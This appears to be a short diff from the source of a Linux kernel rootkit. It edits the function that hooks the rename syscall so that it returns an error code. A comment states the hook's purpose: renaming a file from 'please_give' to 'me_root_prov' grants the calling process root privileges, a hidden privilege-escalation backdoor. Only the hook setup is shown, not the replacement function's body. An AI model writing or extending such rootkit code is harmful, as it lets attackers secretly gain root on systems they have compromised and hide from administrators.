@@ -11,9 +11,13 @@ t_syscall old_rename;
 static asmlinkage long new_rename(const struct pt_regs *pt_regs);
 
 // hook the rename syscall
-void init_root_access(void) {
+int init_root_access(void) {
 	old_rename = get_syscall(__NR_rename);
-	add_hook((unsigned long) new_rename, __NR_rename);
+	if (add_hook((unsigned long) new_rename, __NR_rename)) {
+		return -1;
+	}
+
+	return 0;
 }
 
 // new rename syscall, if the old name is "please_give" and the new name is "me_root_prov", calling process will be granted root privilages and the file will be name "here_you_go"
